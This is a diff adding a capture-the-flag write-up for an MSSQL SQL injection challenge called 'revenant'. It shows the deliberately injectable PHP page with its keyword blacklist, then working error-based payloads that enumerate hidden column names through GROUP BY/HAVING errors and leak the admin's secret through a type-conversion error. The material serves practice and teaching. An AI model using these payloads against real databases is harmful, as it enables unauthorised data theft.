@@ -1,0 +1,64 @@
+<?php
+  include "./config.php";
+  login_chk();
+  $db = mssql_connect();
+  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit("No Hack ~_~");
+  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = "select * from prob_revenant where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  sqlsrv_query($db,$query);
+  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));
+
+  $query = "select * from prob_revenant where id='admin'";
+  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
+  if($result['4'] === $_GET['pw']) solve("revenant"); // you have to pwn 5th column
+  highlight_file(__FILE__);
+?>
+
+Extract column names
+--------------------
+
+2nd:
+
+?id=&pw=' group by id having 1=1--
+
+query : select * from prob_revenant where id='' and pw='' group by id having 1=1--'
+Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.pw' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+
+
+3rd:
+
+?id=&pw=' group by id,pw having 1=1--
+
+query : select * from prob_revenant where id='' and pw='' group by id,pw having 1=1--'
+Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.45a88487' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+
+
+4th:
+
+?id=&pw=' group by pw,id,[45a88487] having 1=1--
+
+query : select * from prob_revenant where id='' and pw='' group by pw,id,[45a88487] having 1=1--'
+Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.13477a35' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+
+5th:
+
+?id=&pw=' group by pw,id,[45a88487],[13477a35] having 1=1--
+
+query : select * from prob_revenant where id='' and pw='' group by pw,id,[45a88487],[13477a35] having 1=1--'
+Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.9604b0c8' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+
+6th:
+
+?id=&pw=' group by pw,id,[45a88487],[13477a35],[9604b0c8] having 1=1--
+
+There is no error. Okey, that's the last column.
+
+
+Pwn column
+----------
+
+?id=&pw=' OR 1=(case when id='admin' then (select [9604b0c8]) else 0 end)--
+
+query : select * from prob_revenant where id='' and pw='' OR 1=(case when id='admin' then (select [9604b0c8]) else 0 end)--'
+Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Conversion failed when converting the varchar value 'aa68a4b3fb327dee07f868450f7e1183' to data type int.
